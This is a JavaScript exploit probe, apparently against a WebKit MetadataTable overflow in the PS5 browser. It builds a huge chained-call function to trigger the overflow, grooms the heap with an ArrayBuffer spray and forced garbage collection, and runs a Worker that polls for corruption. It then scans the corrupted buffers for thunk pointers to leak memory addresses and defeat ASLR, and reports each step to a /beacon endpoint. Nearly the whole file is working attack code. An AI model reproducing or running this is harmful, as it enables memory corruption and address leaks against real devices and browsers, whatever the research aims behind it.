// p505 — MetadataTable overflow: CHAINED CALLS + COMPILE-FIRST
//
// CRITICAL FIX: V503/V504 both OOM during full parse because 38M individual
// a(); statements create ~2.4GB AST. This probe uses CHAINED CALLS:
//   a()()()...() × 50 per statement → 767K statements → ~1.2GB AST
//
// Memory profile with chained calls:
//   Source: 75MB (half of V504's 146MB)
//   AST during full parse: ~1.2GB (half of V504's ~2.4GB)
//   Bytecodes: ~194MB, offset table: ~150MB
//   Peak (during parse): ~1.67GB → should fit PS5's ~2GB limit
//
// Architecture (from V504's compile-first approach):
//   1. Build blob with chained calls → lazy parse → function defined (~75MB retained)
//   2. Free blob/parts → only source retained
//   3. Spray ABs AFTER compile (bait-and-switch, 100 × 100,112B = 10MB)
//   4. GC to free transferred bait backing stores
//   5. Call function → full parse + bytecodeGen + finishCreation → sweep
//   6. typeof guard → skip body → return normally
//   7. Scan ABs from main thread
//
// Worker backup: fetch() + keepalive (XHR blocked on PS5, but fetch might work)
//
// Beacon prefix: V505-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V505-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Build function blob with CHAINED CALLS ═══
  var N = 38348816;
  var CHAIN = 50;
  var FULL_CHAINS = Math.floor(N / CHAIN); // 766976
  var REM = N - FULL_CHAINS * CHAIN;       // 16

  B('BUILD', 'N=' + N + ',chain=' + CHAIN + ',stmts=' + FULL_CHAINS);

  var oneChain = 'a' + '()'.repeat(CHAIN) + ';'; // 102 chars
  var PART_SZ = 50000; // chains per blob part
  var nParts = Math.floor(FULL_CHAINS / PART_SZ); // 15
  var remPart = FULL_CHAINS - nParts * PART_SZ;   // 16976
  var partStr = oneChain.repeat(PART_SZ); // 5.1MB per part

  var parts = [];
  // typeof guard: compiler emits full bytecodes (confirmed: can't constant-fold typeof)
  // Argument 0 → typeof 0 === "string" is false → block skipped at runtime
  parts.push('window.__v505fn=function(a){if(typeof a==="string"){');
  for (var p = 0; p < nParts; p++) parts.push(partStr);
  if (remPart > 0) parts.push(oneChain.repeat(remPart));
  if (REM > 0) parts.push('a' + '()'.repeat(REM) + ';');
  parts.push('}window.__v505ok=1;};');
  partStr = null;
  oneChain = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB', 'sz=' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var blobUrl = URL.createObjectURL(blob);
  var sc = document.createElement('script');

  sc.onerror = function() { B('SCRIPT-ERR', 'load-failed'); };

  sc.onload = function() {
    var hasFn = !!window.__v505fn;
    B('COMPILED', hasFn ? 'OK' : 'FAIL');
    if (!hasFn) { B('DONE', 'no-fn'); return; }

    // Free blob to reclaim ~75MB
    URL.revokeObjectURL(blobUrl);
    blob = null;
    blobUrl = null;
    sc = null;

    // ═══ PHASE 2: Create Worker with fetch-based beaconing ═══
    var workerCode = [
      'var T0W = 0;',
      'function BW(tag, body) {',
      '  var msg = "[" + (Date.now() - T0W) + "ms] " + (body || "");',
      '  // Try fetch with keepalive (XHR blocked on PS5)',
      '  try { fetch("/beacon/V505-W-" + tag, {method: "POST", body: msg, keepalive: true}); } catch(e) {}',
      '  // Also try XHR as fallback',
      '  try {',
      '    var x = new XMLHttpRequest();',
      '    x.open("POST", "/beacon/V505-WX-" + tag, false);',
      '    x.send(msg);',
      '  } catch(e) {}',
      '  // Report back to main thread too',
      '  try { postMessage({type: "beacon", tag: tag, body: body || ""}); } catch(e) {}',
      '}',
      'function hexB(v) { return (v < 16 ? "0" : "") + v.toString(16); }',
      'function hex8(view, off) {',
      '  var s = "";',
      '  for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);',
      '  return s;',
      '}',
      'function u32(view, off) {',
      '  return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;',
      '}',
      '',
      '// Allocate target ABs at higher addresses than main thread baits',
      'var TARGET_N = 100;',
      'var BUF_SZ = 100112;',
      'var targets = [];',
      'var views = [];',
      'for (var i = 0; i < TARGET_N; i++) {',
      '  targets.push(new ArrayBuffer(BUF_SZ));',
      '  views.push(new Uint8Array(targets[i]));',
      '}',
      'postMessage({type: "ready"});',
      '',
      'onmessage = function(e) {',
      '  if (e.data.type !== "go") return;',
      '  T0W = Date.now();',
      '  BW("POLL-START", "targets=" + TARGET_N);',
      '',
      '  // Busy-poll indefinitely until corruption found or killed',
      '  var found = false;',
      '  var polls = 0;',
      '  while (!found) {',
      '    polls++;',
      '    for (var vi = 0; vi < TARGET_N; vi++) {',
      '      var v = views[vi];',
      '      for (var q = 0; q < 1024; q += 8) {',
      '        if (v[q] !== 0 || v[q+1] !== 0 || v[q+2] !== 0 || v[q+3] !== 0) {',
      '          found = true;',
      '          BW("HIT", "idx=" + vi + ",polls=" + polls + ",off=" + q);',
      '          break;',
      '        }',
      '      }',
      '      if (found) break;',
      '    }',
      '    if (polls % 5000000 === 0) {',
      '      BW("STILL", "p=" + polls);',
      '    }',
      '  }',
      '',
      '  // Extract corruption data',
      '  var hitCount = 0;',
      '  var leakedPtrs = [];',
      '  for (var vi = 0; vi < TARGET_N; vi++) {',
      '    var v = views[vi];',
      '    var nz = 0;',
      '    for (var j = 0; j < v.length; j++) { if (v[j] !== 0) nz++; }',
      '    if (nz === 0) continue;',
      '    hitCount++;',
      '    if (hitCount > 3) continue;',
      '',
      '    // Find entry alignment',
      '    var bestBase = -1, bestHits = 0;',
      '    for (var tryBase = 0; tryBase < 112; tryBase += 4) {',
      '      var hits = 0;',
      '      for (var off = tryBase; off + 8 <= v.length; off += 112) {',
      '        if (v[off] !== 0 || v[off+1] !== 0 || v[off+2] !== 0 || v[off+3] !== 0) hits++;',
      '      }',
      '      if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }',
      '    }',
      '    BW("EBASE-" + vi, "base=" + bestBase + ",hits=" + bestHits);',
      '',
      '    // Extract thunk pointers',
      '    var ptrs = 0;',
      '    for (var eOff = bestBase; eOff + 32 <= v.length && ptrs < 8; eOff += 112) {',
      '      var pOff = eOff + 24;',
      '      if (pOff + 8 > v.length) break;',
      '      var anyNZ = false;',
      '      for (var b = 0; b < 8; b++) { if (v[pOff + b]) { anyNZ = true; break; } }',
      '      if (!anyNZ) continue;',
      '      var h = hex8(v, pOff);',
      '      BW("THUNK-" + ptrs, "val=0x" + h);',
      '      if (leakedPtrs.length < 5) leakedPtrs.push(h);',
      '      ptrs++;',
      '    }',
      '',
      '    // Raw dump',
      '    if (hitCount === 1) {',
      '      var chunks = [];',
      '      for (var off = 0; off + 8 <= 336; off += 8) {',
      '        if (v[off]|v[off+1]|v[off+2]|v[off+3]|v[off+4]|v[off+5]|v[off+6]|v[off+7]) {',
      '          chunks.push(off + ":0x" + hex8(v, off));',
      '        }',
      '      }',
      '      if (chunks.length > 0) BW("RAW", chunks.slice(0,12).join(" "));',
      '    }',
      '  }',
      '  BW("RESULT", "hitBufs=" + hitCount + ",ptrs=" + leakedPtrs.length);',
      '  if (leakedPtrs.length > 0) {',
      '    BW("LEAK", "ptr0=0x" + leakedPtrs[0]);',
      '  }',
      '};'
    ].join('\n');

    var wBlob = new Blob([workerCode], {type: 'application/javascript'});
    var wUrl = URL.createObjectURL(wBlob);
    var worker;
    try { worker = new Worker(wUrl); } catch(e) { B('WORKER-ERR', e.message); }

    var workerBeacons = [];
    if (worker) {
      worker.onmessage = function(e) {
        if (e.data.type === 'ready') {
          B('WORKER-READY', '');
          startSpray();
        } else if (e.data.type === 'beacon') {
          workerBeacons.push(e.data.tag + ':' + e.data.body);
          // Forward Worker beacons from main thread
          B('WF-' + e.data.tag, e.data.body);
        }
      };
    } else {
      startSpray();
    }

    function startSpray() {
      // ═══ PHASE 3: Bait-and-switch AB spray ═══
      var BUF_SZ = 100112;
      var SPRAY_N = 100;

      var bufs = new Array(SPRAY_N);
      for (var i = 0; i < SPRAY_N; i++) {
        bufs[i] = new ArrayBuffer(BUF_SZ);
      }
      B('SPRAY', 'n=' + SPRAY_N);

      // Transfer first half to create holes at lower addresses
      var xferred = 0;
      for (var i = 0; i < SPRAY_N / 2; i++) {
        try {
          structuredClone(bufs[i], {transfer: [bufs[i]]});
          xferred++;
        } catch(e) {
          if (xferred === 0) { B('XFER-ERR', e.message.substring(0,60)); break; }
        }
        bufs[i] = null;
      }
      B('XFER', 'n=' + xferred);

      // Views on surviving ABs (higher addresses)
      var views = [];
      for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
        if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
          views.push(new Uint8Array(bufs[i]));
        }
      }
      B('VIEWS', 'n=' + views.length);

      // ═══ PHASE 4: GC to free transferred backing stores ═══
      for (var g = 0; g < 20; g++) {
        var junk = [];
        for (var j = 0; j < 2000; j++) junk.push(new ArrayBuffer(4096));
        junk = null;
      }
      B('GC-DONE', '');

      var alive = 0;
      for (var v = 0; v < views.length; v++) {
        if (views[v] && views[v].length === BUF_SZ) alive++;
      }
      B('ALIVE', 'n=' + alive);

      // ═══ PHASE 5: Call function ═══
      // Signal Worker to start polling BEFORE the call
      if (worker) {
        worker.postMessage({type: 'go'});
      }

      setTimeout(function() {
        B('CALLING', '');

        var callOk = false;
        try {
          window.__v505fn(0); // typeof 0 === "string" → false → skip block
          callOk = true;
        } catch(e) {
          B('CALL-ERR', (e.message || 'unknown').substring(0, 80));
        }

        B('CALL-DONE', callOk ? 'OK-' + (window.__v505ok ? 'fn-ok' : 'fn-noset') : 'THREW');

        // If we survived: the sweep completed without crashing!
        // Free function to reclaim bytecodes + AST
        window.__v505fn = null;

        // Check if Worker found anything via postMessage
        if (workerBeacons.length > 0) {
          B('WORKER-FOUND', 'n=' + workerBeacons.length);
        }

        // ═══ PHASE 6: Scan ABs from main thread ═══
        setTimeout(function() { doScan(views); }, 50);
      }, 100);
    }
  };

  document.head.appendChild(sc);
  sc.src = blobUrl;

  // ═══ SCAN: Read AB views for sweep artifacts ═══
  function doScan(views) {
    B('SCAN-START', 'views=' + views.length);

    var hitBufs = 0;
    var leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;

      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 8) {
        if (view[q] | view[q+1] | view[q+2] | view[q+3]) hasNZ = true;
      }
      if (!hasNZ) continue;
      hitBufs++;

      var nz = 0;
      for (var j = 0; j < view.length; j++) { if (view[j] !== 0) nz++; }
      B('HIT-' + vi, 'nz=' + nz);

      if (hitBufs > 5) continue;

      // Find entry alignment
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      // Extract thunk pointers at entry+24
      var ptrs = 0;
      for (var eOff = bestBase; eOff + 32 <= view.length && ptrs < 8; eOff += 112) {
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        var pOff = eOff + 24;
        var anyNZ = false;
        for (var b = 0; b < 8; b++) { if (view[pOff + b]) { anyNZ = true; break; } }
        if (!anyNZ) continue;
        var h = hex8(view, pOff);
        B('THUNK-' + ptrs, 'off=' + pOff + ',val=0x' + h);
        if (leakedPtrs.length < 8) leakedPtrs.push(h);
        ptrs++;
      }

      // m_bytecodeIndex at entry+68
      var idxs = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxs < 5; eOff += 112) {
        var iOff = eOff + 68;
        var val = u32(view, iOff);
        if (val !== 0 && val !== 0xFFFFFFFF && val < 40000000) {
          B('IDX-' + idxs, 'off=' + iOff + ',val=' + val);
          idxs++;
        }
      }

      // Raw hex dump
      if (hitBufs === 1) {
        var chunks = [];
        for (var off = 0; off + 8 <= 336 && off + 8 <= view.length; off += 8) {
          if (view[off]|view[off+1]|view[off+2]|view[off+3]|
              view[off+4]|view[off+5]|view[off+6]|view[off+7]) {
            chunks.push(off + ':' + hex8(view, off));
          }
        }
        if (chunks.length > 0) B('RAW', chunks.slice(0,15).join(' '));
      }
    }

    B('RESULT', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length + ',views=' + views.length);

    if (leakedPtrs.length > 0) {
      var p0 = leakedPtrs[0];
      var prefix = p0.substring(0, 8);
      var consistent = 0;
      for (var i = 0; i < leakedPtrs.length; i++) {
        if (leakedPtrs[i].substring(0, 8) === prefix) consistent++;
      }
      B('ASLR-LEAK', 'ptr0=0x' + leakedPtrs[0] + ',total=' + leakedPtrs.length + ',consistent=' + consistent);
    } else if (hitBufs > 0) {
      B('SWEEP-HIT', 'no-ptrs-but-nz-data');
    } else {
      B('NO-HIT', 'all-zero');
    }

    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
  }
})();
